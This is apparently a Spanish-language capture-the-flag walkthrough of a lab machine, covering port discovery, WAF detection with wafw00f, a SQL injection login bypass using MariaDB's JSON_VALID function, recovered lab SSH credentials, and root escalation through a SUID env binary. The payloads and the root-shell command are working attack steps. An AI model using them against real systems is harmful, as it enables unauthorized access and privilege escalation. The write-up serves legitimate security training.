## Reconocimiento:

Puerto 22 : SSH

Puerto 80 : HTTP

En la web hay un panel de login, intento una inyección SQL:

```bash
User : '1=1-- -
```

Arroja un mensaje revelando que la versión de la base de datos es MariaDB.

Le hago un escaneo que por el nombre de la máquina intuyo que hay un WAF.

Un **WAF** (*Web Application Firewall*) es un sistema de seguridad que protege aplicaciones web filtrando y bloqueando tráfico malicioso antes de que llegue al servidor.

Así que con wafw00f le hago un análisis:

```bash
wafw00f http://172.17.0.2
```

Confirmo, ya que la respuesta del servidor es 403 ante un CSS. 

Aquí busque bastante y conociendo la versión de la base de datos, decidí investigar y encontré el pass en su documentación:

```bash
https://mariadb.com/docs/server/reference/sql-functions/special-functions/json-functions/json_valid
```

Pruebo con:

```bash
User : 'OR JSON_VALID(id)- --

Pass : 'OR JSON_VALID(id)- --
```

Funciona. 

Revelando así las credenciales SSH:

```bash
User : baluton

Pass : balulerobalulon
```

## Escalada

Listando SUID:

```bash
find / -perm -4000 2>/dev/null
```

Encuentro el binario /env, que no debería de estar ahí.

Gracias GTFO bins:

```bash
sudo -u root /usr/bin/env /bin/bash -p
```

Pero el comando sudo no está instalado. 

Ningún tipo de problema manin:

```bash
/usr/bin/env /bin/bash -p
```

Listo.
